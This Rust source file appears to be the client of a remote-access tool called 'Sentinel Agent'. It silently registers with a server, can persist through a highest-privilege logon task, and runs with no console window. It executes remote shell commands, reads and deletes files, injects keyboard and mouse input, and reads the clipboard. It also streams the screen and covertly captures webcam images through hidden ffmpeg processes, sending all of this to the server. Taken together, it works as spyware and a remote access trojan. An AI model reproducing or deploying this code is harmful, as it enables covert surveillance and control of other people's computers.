// Sentinel Agent — Rust edition.
// Two build targets share this source:
//   agent.exe  → built with --subsystem windows (no console)
//   debug.exe  → normal console build (prints logs)
// First run: auto-registers with the server, persists token next to the exe.
// Then: heartbeats every 5s, polls commands every 1s, streams screen on demand.

#![cfg_attr(all(windows, not(debug_assertions), feature = "windowed"), windows_subsystem = "windows")]

use base64::Engine;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{
    fs,
    io::Cursor,
    path::PathBuf,
    process::Command,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc, Mutex,
    },
    thread,
    time::{Duration, Instant},
};

// ---------- config ----------
//
// Per-build constants live in `src/binding.rs`. The build server overwrites
// that file with the user's user_id, the website URL the build was created
// from, the build name, and startup/debug flags before running `cargo build`.
mod binding;
mod hiden;
mod input;
mod relay;
mod signaling;
mod webrtc;

const DEFAULT_SERVER: &str = binding::SENTINEL_SERVER;
const BIND_USER_ID: Option<&str> = if binding::OWNER_USER_ID.is_empty() {
    None
} else {
    Some(binding::OWNER_USER_ID)
};
const STARTUP_FLAG: bool = binding::STARTUP_TASK;
const STARTUP_NAME_STR: &str = binding::STARTUP_NAME;

#[derive(Serialize, Deserialize, Clone)]
struct Config {
    server: String,
    device_id: String,
    device_token: String,
}

fn config_path() -> PathBuf {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.join("sentinel-agent.json")))
        .unwrap_or_else(|| PathBuf::from("sentinel-agent.json"))
}

fn load_config() -> Option<Config> {
    let s = fs::read_to_string(config_path()).ok()?;
    serde_json::from_str(&s).ok()
}

fn save_config(c: &Config) {
    if let Ok(s) = serde_json::to_string_pretty(c) {
        let _ = fs::write(config_path(), s);
    }
}

// ---------- logging (stderr; invisible in windowed build) ----------

macro_rules! log {
    ($($arg:tt)*) => {{
        eprintln!("[{}] {}", chrono_like_ts(), format!($($arg)*));
    }}
}

fn chrono_like_ts() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
    let h = (secs / 3600) % 24;
    let m = (secs / 60) % 60;
    let s = secs % 60;
    format!("{:02}:{:02}:{:02}", h, m, s)
}

// ---------- http ----------

fn http() -> ureq::Agent {
    ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(10))
        .timeout(Duration::from_secs(60))
        .user_agent("SentinelAgent-Rust/0.2")
        .build()
}

fn post(server: &str, path: &str, body: &Value) -> Result<Value, String> {
    let url = format!("{}{}", server.trim_end_matches('/'), path);
    match http().post(&url).send_json(body.clone()) {
        Ok(resp) => resp.into_json::<Value>().map_err(|e| e.to_string()),
        Err(ureq::Error::Status(code, resp)) => {
            let body = resp.into_string().unwrap_or_default();
            Err(format!("server {}: {}", code, body))
        }
        Err(e) => Err(e.to_string()),
    }
}

// ---------- registration ----------

fn pc_name() -> String {
    gethostname::gethostname().to_string_lossy().to_string()
}
fn username() -> String {
    whoami::username()
}
fn os_name() -> String {
    if cfg!(windows) { "Windows".into() }
    else if cfg!(target_os = "macos") { "macOS".into() }
    else { "Linux".into() }
}

fn auto_register(server: &str) -> Result<Config, String> {
    let mut body = json!({
        "pc_name": pc_name(),
        "device_name": pc_name(),
        "os": os_name(),
        "username": username(),
    });
    if let Some(uid) = BIND_USER_ID {
        body["bind_user_id"] = json!(uid);
    }
    let resp = post(server, "/api/public/agent/auto-register", &body)?;
    let device_id = resp.get("device_id").and_then(|v| v.as_str())
        .ok_or("missing device_id")?.to_string();
    let device_token = resp.get("device_token").and_then(|v| v.as_str())
        .ok_or("missing device_token")?.to_string();
    let cfg = Config { server: server.to_string(), device_id, device_token };
    save_config(&cfg);
    if STARTUP_FLAG { install_startup(); }
    Ok(cfg)
}

#[cfg(windows)]
fn install_startup() {
    let name = STARTUP_NAME_STR;
    if let Ok(exe) = std::env::current_exe() {
        let exe_s = exe.to_string_lossy().to_string();
        let script = format!(
            "schtasks /Create /F /SC ONLOGON /RL HIGHEST /TN \"{}\" /TR \"\\\"{}\\\"\"",
            name.replace('"', ""), exe_s.replace('"', "")
        );
        let _ = powershell(&script);
    }
}
#[cfg(not(windows))]
fn install_startup() {}

// ---------- heartbeat / poll ----------

static STARTED: once_cell_mini::Lazy<Instant> = once_cell_mini::Lazy::new(Instant::now);

mod once_cell_mini {
    use std::sync::OnceLock;
    pub struct Lazy<T, F = fn() -> T> { cell: OnceLock<T>, init: F }
    impl<T, F: Fn() -> T> Lazy<T, F> {
        pub const fn new(init: F) -> Self { Self { cell: OnceLock::new(), init } }
    }
    impl<T> std::ops::Deref for Lazy<T> {
        type Target = T;
        fn deref(&self) -> &T { self.cell.get_or_init(|| (self.init)()) }
    }
}

fn heartbeat(cfg: &Config) {
    let uptime = STARTED.elapsed().as_secs();
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "username": username(),
        "metrics": { "uptime_seconds": uptime },
    });
    if let Err(e) = post(&cfg.server, "/api/public/agent/heartbeat", &body) {
        log!("heartbeat err: {}", e);
    }
}

fn poll(cfg: &Config) -> Vec<Value> {
    let body = json!({ "device_id": cfg.device_id, "device_token": cfg.device_token });
    match post(&cfg.server, "/api/public/agent/poll", &body) {
        Ok(v) => v.get("commands").and_then(|c| c.as_array()).cloned().unwrap_or_default(),
        Err(e) => { log!("poll err: {}", e); vec![] }
    }
}

fn send_result(cfg: &Config, command_id: &str, ok: bool, result: Value, err: Option<String>) {
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "command_id": command_id,
        "ok": ok,
        "result": result,
        "error": err.unwrap_or_default(),
    });
    if let Err(e) = post(&cfg.server, "/api/public/agent/result", &body) {
        log!("result err: {}", e);
    }
}

fn push_screen(cfg: &Config, jpeg_b64: &str) -> Result<(), String> {
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "jpeg_b64": jpeg_b64,
    });
    post(&cfg.server, "/api/public/agent/screen", &body).map(|_| ())
}

fn push_camera(cfg: &Config, jpeg_b64: &str) -> Result<(), String> {
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "jpeg_b64": jpeg_b64,
    });
    post(&cfg.server, "/api/public/agent/camera", &body).map(|_| ())
}

// ---------- camera capture (Windows, via ffmpeg dshow if present) ----------

#[cfg(windows)]
fn capture_camera_jpeg(_quality: u8) -> Result<Vec<u8>, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    // Discover first available DirectShow video device via ffmpeg.
    let list = Command::new("ffmpeg")
        .args(["-hide_banner", "-list_devices", "true", "-f", "dshow", "-i", "dummy"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|_| "ffmpeg not installed — install ffmpeg.exe in PATH for camera capture".to_string())?;
    let text = String::from_utf8_lossy(&list.stderr).to_string();
    let mut device: Option<String> = None;
    let mut in_video = false;
    for line in text.lines() {
        if line.contains("DirectShow video devices") { in_video = true; continue; }
        if line.contains("DirectShow audio devices") { in_video = false; }
        if in_video {
            if let (Some(a), Some(b)) = (line.find('"'), line.rfind('"')) {
                if b > a {
                    device = Some(line[a + 1..b].to_string());
                    break;
                }
            }
        }
    }
    let device = device.ok_or("no DirectShow video device found")?;

    let tmp = std::env::temp_dir().join("sentinel-cam.jpg");
    let _ = fs::remove_file(&tmp);
    let arg = format!("video={}", device);
    let out = Command::new("ffmpeg")
        .args(["-hide_banner", "-loglevel", "error", "-y", "-f", "dshow", "-i", &arg,
               "-frames:v", "1", "-q:v", "5", tmp.to_str().unwrap_or("cam.jpg")])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).to_string());
    }
    fs::read(&tmp).map_err(|e| e.to_string())
}

#[cfg(not(windows))]
fn capture_camera_jpeg(_q: u8) -> Result<Vec<u8>, String> {
    Err("camera capture only supported on Windows".into())
}

// ---------- screen capture ----------

#[cfg(windows)]
fn capture_jpeg(quality: u8) -> Result<(Vec<u8>, u32, u32), String> {
    use screenshots::Screen;
    let screens = Screen::all().map_err(|e| e.to_string())?;
    let screen = screens.into_iter().next().ok_or("no screens")?;
    let img = screen.capture().map_err(|e| e.to_string())?;
    let (w, h) = (img.width(), img.height());
    let rgba = img.into_raw();
    // image crate expects RGBA -> encode JPEG (drops alpha)
    let dyn_img = image::RgbaImage::from_raw(w, h, rgba)
        .ok_or("rgba buffer size mismatch")?;
    let rgb = image::DynamicImage::ImageRgba8(dyn_img).to_rgb8();
    let mut buf = Cursor::new(Vec::with_capacity(256 * 1024));
    let q = quality.clamp(20, 90);
    image::codecs::jpeg::JpegEncoder::new_with_quality(&mut buf, q)
        .encode(rgb.as_raw(), w, h, image::ExtendedColorType::Rgb8)
        .map_err(|e| e.to_string())?;
    Ok((buf.into_inner(), w, h))
}

#[cfg(not(windows))]
fn capture_jpeg(_q: u8) -> Result<(Vec<u8>, u32, u32), String> {
    Err("screen capture only supported on Windows".into())
}

// ---------- command handlers ----------

fn run_shell(cmd: &str) -> Value {
    #[cfg(windows)]
    let out = Command::new("cmd").args(["/C", cmd]).output();
    #[cfg(not(windows))]
    let out = Command::new("sh").args(["-c", cmd]).output();
    match out {
        Ok(o) => json!({
            "stdout": truncate(String::from_utf8_lossy(&o.stdout).to_string(), 200_000),
            "stderr": truncate(String::from_utf8_lossy(&o.stderr).to_string(), 200_000),
            "exit_code": o.status.code().unwrap_or(-1),
        }),
        Err(e) => json!({ "stdout": "", "stderr": e.to_string(), "exit_code": -1 }),
    }
}

fn truncate(mut s: String, n: usize) -> String {
    if s.len() > n { s.truncate(n); s.push_str("\n…[truncated]"); }
    s
}

fn fs_list(p: &str) -> Result<Value, String> {
    let path = if p.is_empty() { if cfg!(windows) { "C:\\".into() } else { "/".into() } } else { p.to_string() };
    let entries = fs::read_dir(&path).map_err(|e| e.to_string())?;
    let mut out = vec![];
    for e in entries.flatten() {
        if let Ok(meta) = e.metadata() {
            out.push(json!({
                "name": e.file_name().to_string_lossy(),
                "is_dir": meta.is_dir(),
                "size": meta.len(),
            }));
        }
    }
    Ok(json!({ "path": path, "entries": out }))
}

fn fs_read(p: &str) -> Result<Value, String> {
    let meta = fs::metadata(p).map_err(|e| e.to_string())?;
    if meta.len() > 5_000_000 { return Err("file too large (max 5MB)".into()); }
    let data = fs::read(p).map_err(|e| e.to_string())?;
    Ok(json!({ "content": String::from_utf8_lossy(&data), "size": data.len() }))
}

fn fs_delete(p: &str) -> Result<Value, String> {
    let meta = fs::metadata(p).map_err(|e| e.to_string())?;
    if meta.is_dir() { fs::remove_dir_all(p) } else { fs::remove_file(p) }
        .map_err(|e| e.to_string())?;
    Ok(json!({ "deleted": p }))
}

fn proc_list() -> Result<Value, String> {
    #[cfg(windows)]
    {
        let out = Command::new("tasklist").args(["/fo", "csv", "/nh"])
            .output().map_err(|e| e.to_string())?;
        let text = String::from_utf8_lossy(&out.stdout);
        let mut procs = vec![];
        for line in text.lines() {
            let cols: Vec<&str> = line.split("\",\"").map(|s| s.trim_matches('"')).collect();
            if cols.len() >= 5 {
                let pid: i64 = cols[1].parse().unwrap_or(0);
                let mem_str: String = cols[4].chars().filter(|c| c.is_ascii_digit()).collect();
                let kb: f64 = mem_str.parse().unwrap_or(0.0);
                procs.push(json!({
                    "pid": pid,
                    "name": cols[0],
                    "memory_mb": kb / 1024.0,
                }));
            }
        }
        Ok(json!({ "processes": procs }))
    }
    #[cfg(not(windows))]
    { Ok(json!({ "processes": [] })) }
}

fn proc_kill(pid: i64) -> Result<Value, String> {
    #[cfg(windows)]
    {
        let out = Command::new("taskkill").args(["/F", "/PID", &pid.to_string()])
            .output().map_err(|e| e.to_string())?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
    }
    Ok(json!({ "killed": pid }))
}

// PowerShell helper, hides console window.
fn powershell(script: &str) -> Result<String, String> {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        let out = Command::new("powershell")
            .args(["-NoProfile", "-NonInteractive", "-Command", script])
            .creation_flags(CREATE_NO_WINDOW)
            .output().map_err(|e| e.to_string())?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
        Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
    }
    #[cfg(not(windows))]
    { let _ = script; Err("powershell not available".into()) }
}

fn system_action(action: &str, payload: &Value) -> Result<Value, String> {
    match action {
        "system.shutdown" => {
            #[cfg(windows)]
            Command::new("shutdown").args(["/s", "/t", "5"]).status().map_err(|e| e.to_string())?;
            Ok(json!({ "ok": true }))
        }
        "system.restart" => {
            #[cfg(windows)]
            Command::new("shutdown").args(["/r", "/t", "5"]).status().map_err(|e| e.to_string())?;
            Ok(json!({ "ok": true }))
        }
        "system.lock" => {
            #[cfg(windows)]
            Command::new("rundll32.exe").arg("user32.dll,LockWorkStation")
                .status().map_err(|e| e.to_string())?;
            Ok(json!({ "ok": true }))
        }
        "system.notify" => {
            let msg = payload.get("message").and_then(|v| v.as_str()).unwrap_or("Notification");
            let title = payload.get("title").and_then(|v| v.as_str()).unwrap_or("Sentinel");
            #[cfg(windows)]
            {
                let script = format!(
                    "Add-Type -AssemblyName System.Windows.Forms; \
                     $n = New-Object System.Windows.Forms.NotifyIcon; \
                     $n.Icon = [System.Drawing.SystemIcons]::Information; \
                     $n.Visible = $true; \
                     $n.ShowBalloonTip(5000, '{}', '{}', 'Info'); \
                     Start-Sleep -Seconds 6; $n.Dispose()",
                    ps_escape(title), ps_escape(msg)
                );
                let _ = powershell(&script);
            }
            Ok(json!({ "ok": true, "message": msg }))
        }
        "system.volume.set" => {
            let level = payload.get("level").and_then(|v| v.as_f64()).unwrap_or(50.0).clamp(0.0, 100.0);
            #[cfg(windows)]
            {
                // Reset to 0 (50 vol-down presses), then up to level/2 presses (~2% step).
                let script = format!(
                    "$w = New-Object -ComObject WScript.Shell; \
                     for($i=0;$i -lt 50;$i++) {{ $w.SendKeys([char]174) }}; \
                     $steps = [math]::Round({} / 2); \
                     for($i=0;$i -lt $steps;$i++) {{ $w.SendKeys([char]175) }}",
                    level
                );
                let _ = powershell(&script);
            }
            Ok(json!({ "ok": true, "level": level }))
        }
        "system.volume.mute" => {
            #[cfg(windows)]
            {
                let _ = powershell("(New-Object -ComObject WScript.Shell).SendKeys([char]173)");
            }
            Ok(json!({ "ok": true }))
        }
        "system.sound.play" => {
            // payload.url = http(s) url to .wav/.mp3, or local path
            let src = payload.get("url").and_then(|v| v.as_str()).unwrap_or("").to_string();
            if src.is_empty() { return Err("missing url".into()); }
            #[cfg(windows)]
            {
                let local_path = if src.starts_with("http") {
                    let tmp = std::env::temp_dir().join("sentinel-sound.tmp");
                    download_to(&src, &tmp)?;
                    tmp.to_string_lossy().to_string()
                } else { src.clone() };
                let lower = local_path.to_lowercase();
                if lower.ends_with(".wav") {
                    let script = format!(
                        "(New-Object Media.SoundPlayer '{}').PlaySync()",
                        ps_escape(&local_path)
                    );
                    let _ = powershell(&script);
                } else {
                    // Use Windows Media Player COM for mp3/other.
                    let script = format!(
                        "$p = New-Object -ComObject WMPlayer.OCX; \
                         $p.URL = '{}'; \
                         $p.controls.play(); \
                         while ($p.playState -ne 1) {{ Start-Sleep -Milliseconds 200 }}",
                        ps_escape(&local_path)
                    );
                    let _ = powershell(&script);
                }
            }
            Ok(json!({ "ok": true, "src": src }))
        }
        _ => Err(format!("unknown system action: {}", action)),
    }
}

fn ps_escape(s: &str) -> String { s.replace('\'', "''") }

fn download_to(url: &str, path: &PathBuf) -> Result<(), String> {
    let resp = http().get(url).call().map_err(|e| e.to_string())?;
    let mut reader = resp.into_reader();
    let mut buf = Vec::with_capacity(64 * 1024);
    std::io::Read::read_to_end(&mut reader, &mut buf).map_err(|e| e.to_string())?;
    fs::write(path, buf).map_err(|e| e.to_string())?;
    Ok(())
}

fn handle_command(cfg: &Config, streaming: &Arc<AtomicBool>, cam_streaming: &Arc<AtomicBool>, cmd: &Value) {
    let id = cmd.get("id").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let action = cmd.get("action").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let payload = cmd.get("payload").cloned().unwrap_or(Value::Null);
    log!("cmd: {} ({})", action, id);

    let result: Result<Value, String> = match action.as_str() {
        "screen.capture" => {
            let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(60) as u8;
            capture_jpeg(q).and_then(|(jpg, w, h)| {
                let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                push_screen(cfg, &b64)?;
                Ok(json!({ "width": w, "height": h, "bytes": jpg.len() }))
            })
        }
        "screen.stream.start" => { streaming.store(true, Ordering::SeqCst); Ok(json!({"streaming": true})) }
        "screen.stream.stop"  => { streaming.store(false, Ordering::SeqCst); Ok(json!({"streaming": false})) }
        "screen.webrtc.start" => {
            let session = payload.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let ice = payload.get("ice_servers").cloned().unwrap_or(Value::Null);
            if session.is_empty() {
                Err("missing session id".into())
            } else {
                webrtc::start_session(&cfg.device_id, &cfg.device_token, &session, &ice)
                    .map(|_| json!({ "accepted": true, "session": session, "stage": "skeleton" }))
            }
        }
        "screen.webrtc.stop" => {
            let session = payload.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
            webrtc::stop_session(&session);
            Ok(json!({ "stopped": true, "session": session }))
        }
        "camera.capture" => {
            let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(65) as u8;
            capture_camera_jpeg(q).and_then(|jpg| {
                let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                push_camera(cfg, &b64)?;
                Ok(json!({ "bytes": jpg.len() }))
            })
        }
        "camera.stream.start" => { cam_streaming.store(true, Ordering::SeqCst); Ok(json!({"streaming": true})) }
        "camera.stream.stop"  => { cam_streaming.store(false, Ordering::SeqCst); Ok(json!({"streaming": false})) }
        "input.mouse"   => input::mouse(&payload),
        "input.key"     => input::key(&payload),
        "input.lock"    => input::lock_input(&payload),
        "clipboard.get" => input::clipboard_get(),
        "clipboard.set" => input::clipboard_set(&payload),
        // Drawing overlays render on the viewer side — server-side ack only.
        "overlay.draw" | "overlay.clear" => Ok(json!({ "ok": true })),
        "shell.exec" => {
            let c = payload.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            if c.is_empty() { Err("empty cmd".into()) } else { Ok(run_shell(c)) }
        }
        "fs.list"   => fs_list(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.read"   => fs_read(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "fs.delete" => fs_delete(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
        "proc.list" => proc_list(),
        "proc.kill" => proc_kill(payload.get("pid").and_then(|v| v.as_i64()).unwrap_or(0)),
        a if a.starts_with("system.") => system_action(a, &payload),
        _ => Err(format!("unknown action: {}", action)),
    };

    // Always echo the result over the relay so the viewer that originated
    // the request can correlate by id without a round-trip through HTTP.
    match &result {
        Ok(v)  => relay::send_result(&id, true, v.clone(), None),
        Err(e) => relay::send_result(&id, false, Value::Null, Some(e.clone())),
    }
    // Also POST to /agent/result so HTTP-only callers (the queued command
    // path) get their reply.
    match result {
        Ok(v)  => send_result(cfg, &id, true, v, None),
        Err(e) => send_result(cfg, &id, false, Value::Null, Some(e)),
    }
}

// ---------- main loops ----------

fn main() {
    // Override server with env var or CLI arg.
    let args: Vec<String> = std::env::args().collect();
    let server_override = std::env::var("SENTINEL_SERVER_URL").ok()
        .or_else(|| args.iter().position(|a| a == "--server").and_then(|i| args.get(i + 1).cloned()));

    let cfg = match load_config() {
        Some(c) => {
            log!("loaded existing config for device {}", c.device_id);
            c
        }
        None => {
            let server = server_override.unwrap_or_else(|| DEFAULT_SERVER.to_string());
            log!("first run — auto-registering at {}", server);
            loop {
                match auto_register(&server) {
                    Ok(c) => { log!("registered as {}", c.device_id); break c; }
                    Err(e) => { log!("register failed: {} — retry in 10s", e); thread::sleep(Duration::from_secs(10)); }
                }
            }
        }
    };

    // Force lazy init of STARTED.
    let _ = STARTED.elapsed();

    let cfg = Arc::new(cfg);
    let streaming = Arc::new(AtomicBool::new(false));
    let cam_streaming = Arc::new(AtomicBool::new(false));

    // Heartbeat thread (every 5s)
    {
        let cfg = cfg.clone();
        thread::spawn(move || loop {
            heartbeat(&cfg);
            thread::sleep(Duration::from_secs(5));
        });
    }

    // Start the persistent HidenHost relay connection (agent role).
    let cmd_rx = relay::start(cfg.device_id.clone());

    // Background worker: consume cmd envelopes from the relay and dispatch
    // them through the same handler the HTTP poll path uses. The worker
    // thread spins up a new OS thread per command so a slow capture/exec
    // doesn't block the relay queue.
    {
        let cfg = cfg.clone();
        let streaming = streaming.clone();
        let cam_streaming = cam_streaming.clone();
        thread::spawn(move || {
            for env in cmd_rx {
                if env.event != "cmd" { continue; }
                // The viewer sends `{ type:"cmd", payload:{ action, ... } }`.
                // hiden.rs strips the outer envelope and gives us
                // `event="cmd"` + `payload=<inner>`. We still need to wrap
                // it for handle_command, which expects `{ id, action,
                // payload }`. The viewer doesn't always supply an `id`,
                // so we synthesise one for correlation.
                let id = env
                    .payload
                    .get("id")
                    .and_then(|v| v.as_str())
                    .map(String::from)
                    .unwrap_or_else(|| format!("relay-{}", chrono_like_ts()));
                let action = env.payload.get("action").and_then(|v| v.as_str()).unwrap_or("").to_string();
                if action.is_empty() { continue; }
                // Use the same payload object as inner — handle_command
                // reads its own sub-fields directly.
                let cmd = json!({ "id": id, "action": action, "payload": env.payload });
                let cfg = cfg.clone();
                let streaming = streaming.clone();
                let cam_streaming = cam_streaming.clone();
                thread::spawn(move || {
                    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                        handle_command(&cfg, &streaming, &cam_streaming, &cmd);
                    }));
                });
            }
        });
    }

    // Screen-stream thread — pushes JPEG frames over the relay (TCP) AND
    // mirrors them to the HTTP endpoint as a hydration fallback.
    {
        let cfg = cfg.clone();
        let streaming = streaming.clone();
        thread::spawn(move || {
            let last_err: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
            loop {
                if streaming.load(Ordering::SeqCst) {
                    let res = capture_jpeg(55).map(|(jpg, _w, _h)| {
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                        // Primary transport: relay (real-time, multi-fps).
                        relay::send_screen_frame(&b64);
                        // Backup: HTTP push (so a viewer who joins late
                        // sees something immediately, throttled).
                        if relay::connected() {
                            // skip HTTP backup when relay is healthy
                        } else {
                            let _ = push_screen(&cfg, &b64);
                        }
                    });
                    if let Err(e) = res {
                        let mut g = last_err.lock().unwrap();
                        if g.as_deref() != Some(e.as_str()) {
                            log!("stream err: {}", e);
                            *g = Some(e);
                        }
                        thread::sleep(Duration::from_secs(2));
                    } else {
                        // ~10 fps when relay-connected, ~2 fps otherwise.
                        let interval = if relay::connected() { 100 } else { 500 };
                        thread::sleep(Duration::from_millis(interval));
                    }
                } else {
                    thread::sleep(Duration::from_millis(400));
                }
            }
        });
    }

    // Camera-stream thread — same shape as screen.
    {
        let cfg = cfg.clone();
        let cam_streaming = cam_streaming.clone();
        thread::spawn(move || {
            let last_err: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
            loop {
                if cam_streaming.load(Ordering::SeqCst) {
                    let res = capture_camera_jpeg(65).map(|jpg| {
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
                        relay::send_camera_frame(&b64);
                        if !relay::connected() {
                            let _ = push_camera(&cfg, &b64);
                        }
                    });
                    if let Err(e) = res {
                        let mut g = last_err.lock().unwrap();
                        if g.as_deref() != Some(e.as_str()) {
                            log!("cam err: {}", e);
                            *g = Some(e);
                        }
                        thread::sleep(Duration::from_secs(3));
                    } else {
                        let interval = if relay::connected() { 200 } else { 700 };
                        thread::sleep(Duration::from_millis(interval));
                    }
                } else {
                    thread::sleep(Duration::from_millis(500));
                }
            }
        });
    }

    // Main HTTP poll loop (still used as a fallback command channel).
    loop {
        let cmds = poll(&cfg);
        for c in cmds {
            let cfg = cfg.clone();
            let streaming = streaming.clone();
            let cam_streaming = cam_streaming.clone();
            thread::spawn(move || {
                let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                    handle_command(&cfg, &streaming, &cam_streaming, &c);
                }));
            });
        }
        thread::sleep(Duration::from_millis(1000));
    }
}
